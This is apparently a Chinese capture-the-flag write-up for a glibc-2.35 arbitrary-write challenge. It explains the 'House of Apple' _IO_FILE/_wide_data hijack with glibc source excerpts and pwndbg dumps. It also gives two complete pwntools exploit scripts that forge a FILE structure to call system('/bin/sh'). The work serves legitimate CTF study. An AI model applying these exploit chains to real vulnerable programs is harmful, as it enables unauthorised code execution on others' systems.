# 【 ? 】Write Where?

> 别问，问就是 IO_FILE，什么？还不知道？看看苹果房子吧，他会帮助你的。

由于题目用的是 glibc-2.35 许多传统的方法都被 ban 了，但是还是有人研究的许多新的利用方法，本题的预期解就是利用 house of apple 中的 `IO` 利用链（在劫持`_IO_FILE->_wide_data`的基础上，直接控制程序执行流）。

> 参考：[House of apple 一种新的glibc中IO攻击方法 (2)-Pwn](https://bbs.kanxue.com/thread-273832.htm)

# 准备
题目给了 glibc 和 ld ，可以用 patchelf 为题目附件更换 libc


```bash
chmod +x ./pwn ./libc.so.6 ./ld-linux-x86-64.so.2 
patchelf --replace-needed libc.so.6 ./libc.so.6 pwn
patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn 
```

# 程序分析

程序很简单：

![](https://cdn.nlark.com/yuque/0/2024/png/35041275/1729431520832-34f6b76a-6a0b-4c80-b428-ea1c9be0364f.png)

![](https://cdn.nlark.com/yuque/0/2024/png/35041275/1729431766792-0aee99cc-5f9b-465d-b196-be190a0e499e.png)

可以利用 puts_addr 得到 libc 地址，接下来就是任意写，写哪里呢？由于开了 PIE ，偏移的基址得不到，栈的基地址也得不到，那么可以下手的地方就 libc 。

上面也提及了本题的预期解就是利用 house of apple 中的 `IO` 利用链（在劫持`_IO_FILE->_wide_data`的基础上，直接控制程序执行流。）

部分 IO 保护源代码：

```cpp
if ((
    (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	|| (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && 
                (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
        )
	)
	&& _IO_OVERFLOW (fp, EOF) == EOF)
```

```cpp
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */        #cond.6
#define _IO_CURRENTLY_PUTTING 0x0800

if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);                                              #call this
	  _IO_free_wbackup_area (f);
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	}
```

IO_FILE 部分重要的结构：


```cpp
pwndbg> p *((FILE*)_IO_list_all)
$4 = {
  _flags = 996700960,       #0x3b687320 & 0x0008 and & 0x0800 == 0
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x1 <error: Cannot access memory at address 0x1>,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x74d6ab050d70 <__libc_system>,
  _fileno = 0,
  _flags2 = 0,
  _old_offset = -1,
  _cur_column = 0,
  _vtable_offset = 0 '\000',
  _shortbuf = "",
  _lock = 0x74d6ab21b6d8 <_IO_2_1_stderr_+56>,
  _offset = -1,
  _codecvt = 0x0,
  _wide_data = 0x74d6ab21b690,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = 0,
  _unused2 = '\000' <repeats 19 times>
}
pwndbg> p *((FILE*)_IO_list_all)._wide_data
$5 = {
  _IO_read_ptr = 0x3b687320 <error: Cannot access memory at address 0x3b687320>,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x1 <error: Cannot access memory at address 0x1>,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0,
    __value = {
      __wch = 0,
      __wchb = "\000\000\000"
    }
  },
  _IO_last_state = {
    __count = 0,
    __value = {
      __wch = 0,
      __wchb = "\000\000\000"
    }
  },
  _codecvt = {
    __cd_in = {
      step = 0x74d6ab050d70 <__libc_system>,
      step_data = {
        __outbuf = 0x0,
        __outbufend = 0xffffffffffffffff <error: Cannot access memory at address 0xffffffffffffffff>,
        __flags = 0,
        __invocation_counter = 0,
        __internal_use = -1423853864,
        __statep = 0xffffffffffffffff,
        __state = {
          __count = 0,
          __value = {
            __wch = 0,
            __wchb = "\000\000\000"
          }
        }
      }
    },
    __cd_out = {
      step = 0x74d6ab21b690,
      step_data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0,
        __invocation_counter = 0,
        __internal_use = 0,
        __statep = 0x0,
        __state = {
          __count = 0,
          __value = {
            __wch = 0,
            __wchb = "\000\000\000"
          }
        }
      }
    }
  },
  _shortbuf = L"\xab2170c0",
  _wide_vtable = 0x74d6ab21b690
}
```

# exp
## 题解一

利用链：

`puts -> __xsputn -> 伪造为 _IO_wfile_overflow`

`IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE -> *(fp->_wide_data->_wide_vtable + 0x68)(fp)`

![](https://cdn.nlark.com/yuque/0/2024/png/35041275/1729432259713-104a2bc2-50fa-45b5-af6f-52831dbec401.png)

利用 _IO_wfile_overflow 函数控制程序执行流：

+ `_flags` = `~(2 | 0x8 | 0x800)`
+ `vtable` = `_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap` 的地址（加减偏移）
+ `_wide_data` = 可控堆地址`A`（即满足 `*(fp+0xa0)=A`）
+ `_wide_data->_IO_write_base` = `0`（即满足 `*(A+0x18)=0`）
+ `_wide_data->_IO_buf_base` = `0`（即满足 `*(A+0x30)=0`）
+ `_wide_data->_wide_vtable` = 可控堆地址`B`（即满足 `*(A+0xe0)=B`）
+ `_wide_data->_wide_vtable->doallocate` = 地址`C`，用于劫持 `RIP`（即满足 `*(B+0x68)=C`）

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

p = process('./pwn')
# p = remote('202.199.6.66', 37306)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# leak libc base
p.recvuntil('0x')
put_addr = int(p.recvline(), 16)
libc.address = put_addr - libc.symbols['puts']
success("puts addr: " + hex(put_addr))
success("libc base: " + hex(libc.address))

# 覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针
stdout_addr = libc.symbols['_IO_2_1_stdout_']
success("stdout addr: " + hex(stdout_addr))

p.send(p64(stdout_addr))

A = stdout_addr
B = stdout_addr

# 利用链
# puts -> __xsputn -> 伪造为 _IO_wfile_overflow
# _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE -> *(fp->_wide_data->_wide_vtable + 0x68)(fp)
fake = FileStructure(0)
fake.flags = b"\xf5\xf7;\sh;\x00"                       # _flags = ~(2 | 0x8 | 0x800) (由于要布置 \sh;，进行了一点修改)
fake._lock = libc.symbols['_IO_stdfile_1_lock']         # 绕过检测
fake._wide_data = A                                     # 满足 *(fp+0xa0)=A
fake.chain = libc.symbols['system']                     # 满足 *(B+0x68)=C
fake.vtable = libc.symbols['_IO_wfile_jumps'] - 0x20    # vtable = _IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap 的地址（加减偏移）

# 自动会用 0x00 填充，所以这里不用管
# ● _wide_data->_IO_write_base = 0（即满足 *(A+0x18)=0）
# ● _wide_data->_IO_buf_base = 0（即满足 *(A+0x30)=0）

fake = flat({
    0: bytes(fake),
    0xe0: B                                             # 满足 *(A+0xe0)=B
})

# gdb.attach(p, 'b system')
p.send(fake)

p.interactive()
```

## 题解二

调用链 

`_IO_flush_all -> _IO_flush_all_lockp -> [_IO_wdefault_xsgetn](IO_wstrn_jumps) （伪造）`

`_IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE -> *(fp->_wide_data->_wide_vtable + 0x68)(fp)`

![](https://cdn.nlark.com/yuque/0/2024/png/35041275/1729432428766-825cf652-2d2f-4c2d-b578-8e73568dbe84.png)


```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

path = './pwn'
p = process(path)
#p = remote('202.199.6.66', 39964)
elf = ELF(path)
libc = ELF('./libc.so.6')

p.recvuntil(b'puts_addr: ')
puts_address = int(p.recvline()[:-1], 16)
log.success(f'puts_address: {hex(puts_address)}')
libc.address = puts_address - libc.sym['puts']
log.success(f'libc.address: {hex(libc.address)}')

fp_address = libc.sym['_IO_list_all'] + 0x10
log.success(f'fp_address: {hex(fp_address)}')

fake = FileStructure(0)
fake._IO_write_ptr = 1                                  #mode = 0
fake._IO_write_base = 0                                 #cond.1 (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)

fake._lock = fp_address + 0x48                          #cond.2 _IO_flockfile (fp); _lock address vaild
fake._wide_data = fp_address                            #cond.3 vtable address(_wide_data)
fake.chain = libc.sym['system']                         #cond.4 vtable(*(_wide_data+0xe0))+0x68 -> win_address
fake.vtable = (libc.sym['_IO_wfile_jumps']+24) - 0x18   #cond.5 _IO_wfile_overflow  <_IO_flush_all_lockp+223>    call   qword ptr [rax + 0x18]
fake.flags = b' '*8                                     #cond.6    0x7b262828639e <_IO_wfile_overflow+14>     mov    eax, dword ptr [rdi]     EAX, [0x7b262841b690] => 0x6e69622f
                                                               # ► 0x7b26282863a0 <_IO_wfile_overflow+16>     test   al, 8                    0x2f & 0x8     EFLAGS => 0x202 [ cf pf af zf sf IF df of ]
                                                               #   0x7b26282863a2 <_IO_wfile_overflow+18>   ✔ jne    _IO_wfile_overflow+304      <_IO_wfile_overflow+304>                   
fake._IO_read_ptr = b'/bin/sh\x00'                      #空格填充后接着填入 /bin/sh

fake = flat({
    0:bytes(fake),
    0xe0:fp_address                                     #cond.4
})

payload = p64(fp_address) + p64(0) + bytes(fake)

p.recvuntil(b'Write where?\n')
p.send(p64(libc.sym['_IO_list_all']))

# gdb.attach(p, 'b _IO_flush_all_lockp')
p.send(bytes(payload))

p.interactive()
```

